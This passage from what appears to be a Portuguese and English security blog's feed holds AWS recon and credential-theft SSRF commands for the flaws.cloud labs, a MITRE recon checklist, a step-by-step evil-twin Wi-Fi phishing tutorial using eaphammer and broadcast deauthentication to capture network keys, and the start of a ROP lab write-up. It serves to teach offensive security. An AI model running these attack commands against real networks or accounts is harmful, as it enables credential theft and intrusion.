--no-sign-request</code></li> </ul> <h4 id="internalauthenticated">Internal/Authenticated</h4> <ul> <li><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum#enumeration">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum#enumeration</a></li> </ul> <p>1 - Listing the Contents of Buckets:</p> <ul> <li><code class="language-plaintext highlighter-rouge">aws s3 --profile YOUR_ACCOUNT ls s3://BUCKET-NAME</code></li> </ul> <p>2 - S3 misconfig series:</p> <ol> <li><a href="http://flaws.cloud/">http://flaws.cloud/</a></li> <li><a href="http://flaws.cloud/hint1.html">http://flaws.cloud/hint1.html</a></li> <li><a href="http://flaws.cloud/hint2.html">http://flaws.cloud/hint2.html</a></li> <li><a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/</a></li> <li><a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html</a></li> <li><a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/</a></li> <li><a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html</a></li> <li><a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/</a></li> <li><a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html</a></li> <li><a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html</a></li> <li><a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint3.html">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint3.html</a></li> <li><a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/hint2.html">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/hint2.html</a></li> <li><a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/hint3.html">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/hint3.html</a></li> <li><a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/">http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</a></li> <li><a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint1.html">http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint1.html</a></li> <li><a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint2.html">http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint2.html</a></li> <li><a href="http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/">http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/</a></li> <li><a href="http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/">http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/</a> (lambda leak envs with creds)</li> </ol> <blockquote> <h3 id="iam">IAM</h3> </blockquote> <p>1 - <a href="https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/">https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/</a></p> <ul> <li><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-basic-information#cli-authentication">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-basic-information#cli-authentication</a></li> </ul> <p>When you find credentials to AWS, you can add them to your AWS Profile in the AWS CLI. For this, you use the command:</p> <p><a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html#cli-configure-files-using-profiles">https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html#cli-configure-files-using-profiles</a></p> <p><code class="language-plaintext highlighter-rouge">aws configure --profile PROFILENAME</code></p> <p>This command will add entries to the .aws/config and .aws/credentials files in your user’s home directory.</p> <p><code class="language-plaintext highlighter-rouge">ProTip: Never store a set of access keys in the [default] profile. Doing so forces you always to specify a profile and never accidentally run a command against an account you don't intend to.</code></p> <p>2 - A few other common AWS reconnaissance techniques are:</p> <ul> <li>Finding the Account ID belonging to an access key: <ul> <li><code class="language-plaintext highlighter-rouge">aws sts get-access-key-info --access-key-id AKIAEXAMPLE</code></li> </ul> </li> <li>Determining the Username the access key you’re using belongs to <ul> <li><code class="language-plaintext highlighter-rouge">aws sts get-caller-identity --profile PROFILENAME</code></li> </ul> </li> <li>Listing all the EC2 instances running in an account <ul> <li><code class="language-plaintext highlighter-rouge">aws ec2 describe-instances --output text --profile PROFILENAME</code></li> </ul> </li> <li>Listing all the EC2 instances running in an account in a different region <ul> <li><code class="language-plaintext highlighter-rouge">aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME</code></li> </ul> </li> </ul> <p>3 - Enum Policies</p> <ul> <li> <p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-iam-enum">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-iam-enum</a></p> </li> <li>Get metadata of user <ul> <li><code class="language-plaintext highlighter-rouge">aws --profile PROFILE-NAME iam get-user</code></li> </ul> </li> <li>Get policies of user <ul> <li><code class="language-plaintext highlighter-rouge">aws --profile PROFILE-NAME iam list-attached-user-policies --user-name CURRENT-OR-OTHER</code></li> </ul> </li> <li>Get policy content <ul> <li><code class="language-plaintext highlighter-rouge">aws --profile PROFILE-NAME iam get-policy --policy-arn &lt;policy_arn&gt;</code></li> <li><code class="language-plaintext highlighter-rouge">aws iam get-policy-version --policy-arn &lt;arn:aws:iam::975426262029:policy/list_apigateways&gt; --version-id &lt;VERSION_X&gt;</code></li> </ul> </li> </ul> <blockquote> <h3 id="ec2">EC2</h3> </blockquote> <h4 id="internalauthenticated-1">Internal/Authenticated</h4> <ul> <li> <p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum</a></p> </li> <li>Discovery snapshots <ul> <li><code class="language-plaintext highlighter-rouge">aws --profile PROFILE-NAME ec2 describe-snapshots --owner-id ACCOUNT-ID</code></li> </ul> </li> <li>Snapshot Dump <ul> <li><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump</a></li> <li><a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html</a></li> <li><a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html</a></li> <li><a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint3.html">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint3.html</a></li> </ul> </li> </ul> <blockquote> <h3 id="ecr-elastic-container-registry">ECR (Elastic Container Registry)</h3> </blockquote> <h4 id="internalauthenticated-2">Internal/Authenticated</h4> <ul> <li>Get repos <ul> <li><code class="language-plaintext highlighter-rouge">aws ecr describe-repositories --profile PROFILE-NAME</code></li> <li><code class="language-plaintext highlighter-rouge">aws ecr describe-registry --profile PROFILE-NAME</code></li> </ul> </li> <li>Get image metadata <ul> <li> <p><code class="language-plaintext highlighter-rouge">aws ecr list-images --repository-name &lt;repo_name&gt; --profile PROFILE-NAME</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">aws ecr list-images --repository-name &lt;repo_name&gt; --resgistry-id ACCOUNT-ID --profile PROFILE-NAME</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:..."</code></p> </li> </ul> </li> <li>Login, Pull &amp; Push <ul> <li>login - <code class="language-plaintext highlighter-rouge">aws ecr --profile PROFILE-NAME get-login-password --region REGION | docker login --username AWS --password-stdin ACCOUNT-ID.dkr.ecr.REGION.amazonaws.com</code></li> <li>pull image - <code class="language-plaintext highlighter-rouge">docker pull &lt;account_id&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;img_name&gt;:latest</code></li> </ul> </li> <li>Get image metadata <ul> <li><code class="language-plaintext highlighter-rouge">aws ecr describe-images --repository-name level2 --profile PROFILE-ID</code></li> </ul> </li> <li>SSRF in AWS ECS (Container Service) <ul> <li><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#ssrf-in-aws-ecs-container-service-credentials">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#ssrf-in-aws-ecs-container-service-credentials</a></li> <li><a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html">https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html</a> <ol> <li><code class="language-plaintext highlighter-rouge">curl -v http://container.target.flaws2.cloud/proxy/file:///proc/self/environ -o environ</code></li> <li>In “environ” output file found variable “AWS_CONTAINER_CREDENTIALS_RELATIVE_URI” copy paste in next curl cli:</li> <li><code class="language-plaintext highlighter-rouge">curl -v http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cd0f067f-f28a-4f8a-ba76-0e697ec1d289</code></li> <li>Get creds …</li> </ol> </li> </ul> </li> </ul> <blockquote> <p>constantly adding more …</p> </blockquote>]]></content><author><name></name></author><category term="cloud"/><category term="recon"/><summary type="html"><![CDATA[aws recon and misconfig notes]]></summary></entry><entry><title type="html">mitre attack recon method</title><link href="https://geleiaa.github.io/blog/2024/mitre_recon/" rel="alternate" type="text/html" title="mitre attack recon method"/><published>2024-03-04T00:00:00+00:00</published><updated>2024-03-04T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/mitre_recon</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/mitre_recon/"><![CDATA[<h2 id="mitre-recon">Mitre Recon</h2> <p>Essa lista é uma ordem lógica das fases de recon baseado no mitre-pre <a href="https://attack.mitre.org/matrices/enterprise/pre/">https://attack.mitre.org/matrices/enterprise/pre/</a>. A ordem das fases é como eu vejo a melhor forma de se organizar e executar um recon em uma empresa/organização, isso vai desde osint basico até o início da enumeração de rede/ativos.</p> <h3 id="1---gather-victim-org-information">1 - Gather Victim Org Information</h3> <ul> <li><a href="https://attack.mitre.org/techniques/T1591/">https://attack.mitre.org/techniques/T1591/</a></li> <li>Determine Physical Locations</li> <li>Business Relationships</li> <li>Identify Business Tempo</li> <li>Identify Roles</li> </ul> <h3 id="2---gather-victim-identity-information">2 - Gather Victim Identity Information</h3> <p><a href="https://attack.mitre.org/techniques/T1589/">https://attack.mitre.org/techniques/T1589/</a></p> <p>Credentials</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1589/001/">https://attack.mitre.org/techniques/T1589/001/</a></li> </ul> <p>Email Address</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1589/002/">https://attack.mitre.org/techniques/T1589/002/</a></li> </ul> <p>Employee Names</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1589/003/">https://attack.mitre.org/techniques/T1589/003/</a></li> </ul> <h3 id="3---search-open-websitesdomains">3 - Search Open Websites/Domains</h3> <p><a href="https://attack.mitre.org/techniques/T1593/">https://attack.mitre.org/techniques/T1593/</a></p> <ul> <li><a href="https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e">https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e</a></li> <li><a href="https://securitytrails.com/blog/google-hacking-techniques">https://securitytrails.com/blog/google-hacking-techniques</a></li> <li><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></li> </ul> <p>Social media</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1593/001/">https://attack.mitre.org/techniques/T1593/001/</a></li> </ul> <p>Code Repositories (github search)</p> <h3 id="4---search-open-technical-databases">4 - Search Open Technical Databases</h3> <p><a href="https://attack.mitre.org/techniques/T1596/">https://attack.mitre.org/techniques/T1596/</a></p> <ul> <li>some whois</li> <li>passive dns - <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li> <li>digital certs - <a href="https://www.sslshopper.com/ssl-checker.html">https://www.sslshopper.com/ssl-checker.html</a></li> <li>CDNs</li> <li>shodan and others…</li> </ul> <h3 id="5---search-victim-owned-websites">5 - Search Victim-Owned Websites</h3> <p><a href="https://attack.mitre.org/techniques/T1594/">https://attack.mitre.org/techniques/T1594/</a></p> <h3 id="6---search-closed-sources">6 - Search Closed Sources</h3> <p>Threat Intel Vendors</p> <ul> <li><a href="https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/">https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/</a></li> <li><a href="https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/">https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/</a></li> </ul> <h3 id="7---gather-victim-network-information">7 - Gather Victim Network Information</h3> <p>FQDNs</p> <ul> <li><a href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/">https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/</a></li> </ul> <p>Network Trust Dependencies</p> <ul> <li><a href="https://www.slideshare.net/rootedcon/carlos-garca-pentesting-active-directory-forests-rooted2019">https://www.slideshare.net/rootedcon/carlos-garca-pentesting-active-directory-forests-rooted2019</a></li> </ul> <p>IP Addresses</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1590/005/">https://attack.mitre.org/techniques/T1590/005/</a></li> </ul> <p>Network Security Appliances</p> <ul> <li><a href="https://nmap.org/book/firewalls.html">https://nmap.org/book/firewalls.html</a></li> </ul> <h3 id="8---gather-victim-host-information">8 - Gather Victim Host Information</h3> <p>Software</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1592/002/">https://attack.mitre.org/techniques/T1592/002/</a></li> </ul> <h3 id="9---phishing-for-information">9 - Phishing for Information</h3> <p><a href="https://attack.mitre.org/techniques/T1598/">https://attack.mitre.org/techniques/T1598/</a></p> <h3 id="10---active-scanning">10 - Active Scanning</h3> <p>Scanning IP Blocks</p> <p>Vulnerability Scanning <a href="https://attack.mitre.org/techniques/T1595/002/">https://attack.mitre.org/techniques/T1595/002/</a></p> <p>Wordlist Scanning (brute-force)</p> <ul> <li><a href="https://github.com/clarketm/s3recon">https://github.com/clarketm/s3recon</a></li> <li><a href="https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/">https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/</a></li> </ul>]]></content><author><name></name></author><category term="bhatagem"/><category term="recon"/><summary type="html"><![CDATA[mitre recon notes]]></summary></entry><entry><title type="html">captive-portal attack com eaphammer</title><link href="https://geleiaa.github.io/blog/2024/captive_portal/" rel="alternate" type="text/html" title="captive-portal attack com eaphammer"/><published>2024-02-15T00:00:00+00:00</published><updated>2024-02-15T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/captive_portal</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/captive_portal/"><![CDATA[<h2 id="ataque-de-captive-portal-com-eaphammer">Ataque de Captive Portal com eaphammer</h2> <h4 id="o-ataque-de-captive-portal-consiste-em-subir-uma-rede-wifi-falsa-imitando-a-rede-alvo-aka-rogue-ap-fake-ap-ou-evil-twin-para-que-os-clientes-da-rede-alvo-se-conectem-na-rede-falsa-caiam-em-uma-pagina-phishing-e-assim-passem-a-psk-da-rede-legítima">O ataque de captive-portal consiste em subir uma rede wifi falsa imitando a rede alvo (aka rogue ap, fake ap ou evil twin), para que os clientes da rede alvo se conectem na rede falsa, caiam em uma pagina phishing e assim passem a psk da rede legítima.</h4> <p>Para esse ataque você vai precisar de:</p> <p>1 - a tool eaphammer (https://github.com/s0lst1c3/eaphammer)</p> <p>2 - um adaptador wireless que suporte o modo AP(access point)</p> <p>3 - um adaptador wireless que suporte o modo Monitor</p> <p>4 - algum conhecimento basico de frontend</p> <h3 id="1---escolhendo-a-pagina-de-phishing">1 - escolhendo a pagina de phishing:</h3> <p>A pagina de phishing pode depender do cenario em que o ataque será feito, então fica a critério do atacante escolher a mais adequada.</p> <p>Para esse tutorial vou usar uma pagina que é usada em outra tool de wifi hacking, a tool wifiphishing. Essa pagina simula uma atualização de firmware do roteador: https://wifiphisher.org/ps/firmware-upaginarade/</p> <h3 id="2---clonando-a-pagina-de-phishing-para-a-tool-adicionando-template">2 - clonando a pagina de phishing para a tool (adicionando template):</h3> <p>A tool eaphammer tem uma opção de clonar paginas para serem usadas nos ataques de captive portal. Então vamos clonar a pagina para usar no nosso ataque:</p> <p>Nota: Tive problemas para clonar a pagina direto do link acima, então tive que fazer download dos arquivos e subila-la localmente pelo apache para assim clonar usando a tool. A pagina é feita de simples arquivos estaticos. A estrutura do dir deve ficar assim:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/html
├── asus.png
├── bootstrap.min.css
├── bootstrap.min.js
├── jquery.min.js
└── index.html
</code></pre></div></div> <p>Faça download dos arquivos da pagina, mova-os para /var/www/html, starte o serviço do apache e acesse o localhost (127.0.0.1) no navegador.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/pihishrouterpg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Nessa parte você precisa ajustar os paths dos arquivos estaticos de css (no html) para a pagina ficar legivel (aqui que entra o conhecimento de frontend). Se a pagina estiver normal, rode o seguinte comando para clona-la:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ #./eaphammer --create-template --name firm-update --description "description..." --url http://127.0.0.1/
</code></pre></div></div> <p>Para confirmar que a pagina foi clonada você pode listar os templates disponiveis:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ #./eaphammer --list-templates

[*] Listing available captive portal templates:

download         - Prompt targets to download an implant.
login            - Present user with a login page. Includes embedded realtime keylogger.
firm-update      - router firmware update page    &lt;===========
</code></pre></div></div> <h3 id="3---editando-a-pagina-template">3 - editando a pagina (template):</h3> <p>Durante meus testes com a pagina de phishing clonada tive problemas para receber a psk que é mandado pelo frontend para o backend da tool. Fazendo debugging nas requests enviadas e recebidas, percebi que quando a tool sobe a pagina ela injeta um código javascript que é usado para mandar os dados recebidos no frontend para o backend e assim mostrado nos logs do terminal… esse js espera receber um body mais ou menos assim <code class="language-plaintext highlighter-rouge">{username: name, password: pass}</code>.</p> <p>Então se você se deparar com esse problema, para resolver vá até os arquivos do template da pagina clonada em <code class="language-plaintext highlighter-rouge">eaphammer/templates/seu-templete/</code> e adicione um campo de “username” junto ao campo de “password” dessa forma(com os atributos html também):</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input type='text' name='username' value='TARGET-ESSID'/&gt;&lt;br/&gt;
&lt;input type='password' name='password'/&gt;&lt;br/&gt;
</code></pre></div></div> <p>Adicione também o atributo method=’post’ na tag do form, caso não tenha.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form method='POST'&gt;
</code></pre></div></div> <p>(veja os templates default para mais exemplos)</p> <p>Dica: Para colaborar com a pagina de phishing o campo username pode ser o essid da rede alvo como valor default (value=’TARGET-ESSID’).</p> <p>Você tera que editar a pagina antes de subir a rede falsa. Fazendo isso o backend da tool vai receber os dados normalmente.</p> <p>Depois de alterações o pagina deve ficar assim:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/inputhtmledit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/pgrendered.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Nota: Você pode fazer o mesmo processo de editar o html para mudar outras partes, como o logo do vendor do roteador alvo, traduzir a pagina para portugues e etc. Isso para aumentar a credibilidade do phishing (fica critério do atacante).</p> <h3 id="4---subindo-o-fake-ap">4 - subindo o fake ap:</h3> <p>Agora é a hora que vamos precisar usar as duas placas de rede (adaptadores) ou só uma, se a placa suportar os modos necessarios. Para essa demonstração usei placas com os seguintes chipsets: RTL8812AU (suporta modo AP) e RTL8192EU (suporta modo Mon)</p> <h4 id="starte-o-fake-ap-com-a-placa-que-suporta-ap">Starte o fake ap com a placa que suporta AP:</h4> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./eaphammer --captive-portal --portal-template seu-template --essid "TARGET-ESSID" --channel TARGET-CHANNEL --bssid 11:22:33:44:55:66 --interface INTERFACE-NAME
</code></pre></div></div> <p>Dica:</p> <ul> <li>em <code class="language-plaintext highlighter-rouge">--essid</code> deve ser o mesmo nome do alvo para ser convincente.</li> <li>O <code class="language-plaintext highlighter-rouge">--bssid</code> deve ser parecido com o da rede alvo, alterando apenas um numero em qualquer lugar (de preferencia o ultimo), porque um mac igual ao da rede alvo pode conflitar na hora de mandar deauths. Ex: mac alvo = 1C:7E:E5:97:79:B1, mac fake ap = 1C:7E:E5:97:79:B2.</li> </ul> <p>Se estiver tudo certo o fake ap vai ser iniciado como uma rede OPEN e você poderá ve-la igual qualquer outra rede (mas não se conecte a rede quando estiver fazendo o ataque). Você verá nos logs do terminal que o ap está ativo:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/fakeapok.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>exemplo de visão do alvo</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/clientexample.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h4 id="deauth-na-rede-alvo">Deauth na rede alvo:</h4> <p>Depois que o fake ap estiver up e esperando conexões você deve desautenticar os clientes da rede alvo para que eles possam se conectar no fake ap. Use o aireplay-ng pra isso:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng -0 0 -a TARGET-AP-MAC INTEFACE-NAME
</code></pre></div></div> <p>Dica: o comando acima manda deauth para o broadcast da rede alvo, ou seja, todos os clientes vão receber os pacotes de deauth. Essa é a melhor forma porque não adianta muito você desautenticar apenas um cliente e os outros continuarem conectados normalmente, e você também corre o risco de ser percebido por causa das diferença da rede legitima e a falsa.</p> <h4 id="logs-do-fake-ap">logs do fake ap:</h4> <p>Quando alguém se conectar ao fake ap, os logs vão aparecer na tela do terminal junto com os logs do DNS-spoofing funcionando e redirecionando os dispositivos conectados para a pagina de phishing:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/clientconect.png" class="img-fluid rounded z-depth-1" width="800" height="800" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Conforme o client vai tentando acessar outras paginas pelo navegador o ataque de spoofing continua redirencionando para a pagina de phishing.</p> <p>exemplo de visão do alvo em smartphone</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/phoneexample.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>O client conectado verá o pagina de atualização de firmware e se a sua eng-social der certo, ele digitara a senha pensando que há uma atualização de firmware do roteador… e a psk digitada vai aparecer nos logs do fake ap:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/recvpsk.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div>]]></content><author><name></name></author><category term="bhatagem"/><category term="wifi"/><summary type="html"><![CDATA[recuperando psk ...]]></summary></entry><entry><title type="html">ROP lab RPISEC</title><link href="https://geleiaa.github.io/blog/2024/rop_lab/" rel="alternate" type="text/html" title="ROP lab RPISEC"/><published>2024-01-12T00:00:00+00:00</published><updated>2024-01-12T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/rop_lab</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/rop_lab/"><![CDATA[<h3 id="solving-lab5c-0313---rop-lab-httpsgithubcomrpisecmbeblobmastersrclab05lab5cc">Solving lab5C “03/13 | –[ ROP Lab” (https://github.com/RPISEC/MBE/blob/master/src/lab05/lab5C.c)</h3> <h3 id="this-lab-is-related-to-the-exploration-of-depnx">This lab is related to the exploration of DEP/NX.</h3> <p>First I’ll talk about the problem I had with compiling the binary. This lab is made for 32-bit architecture and the exploit is also 32-bit based. And my idea was to do it in 64. So, due to some problems with address randomization, I had to add the <code class="language-plaintext highlighter-rouge">-no-pie</code> flag to compile it. It was compiled like this:</p> <p><code class="language-plaintext highlighter-rouge">gcc lab5C.c -o lab5C -fno-stack-protector -no-pie</code></p> <p>As the exploration learned in the slides is for 32 bits, I had to use a technique aimed at 64 bits. I did a step by step of this technique here: https://geleiaa.github.io/blog/2024/bypass_NX/</p> <p>And now let’s see how it was applied in this binary.</p> <p>Let’s look at the source code to see what the binary does.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cm">/* gcc -fno-stack-protector -o lab5C lab5C.c */</span>

<span class="kt">char</span> <span class="n">global_str</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

<span class="cm">/* reads a string, copies it to a global */</span>
<span class="kt">void</span> <span class="nf">copytoglobal</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">global_str</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"I included libc for you...</span><span class="se">\n</span><span class="s">"</span>\
           <span class="s">"Can you ROP to system()?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">copytoglobal</span><span class="p">();</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <p>It looks like simple code. The main prints some text. And the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function does exactly that, it takes what comes from stdin and passes it to the global variable.</p> <p>Running the binary:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/runbinrop.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="to-begin-the-exploration-lets-see-if-we-can-overflow-this-buffer-that-stores-the-input">To begin the exploration, let’s see if we can overflow this buffer that stores the input.</h3> <p>Arriving at the RET of the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function we see that it was overwritten after 136 bytes of our pattern:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/retoverwriterop.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Now that we know how to overwrite the return address of the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function, let’s go with the ROP + ret2libc techniques.</p> <h3 id="rop--ret2libc">ROP + ret2libc</h3> <p>For this exploration we will need three things: 1 - 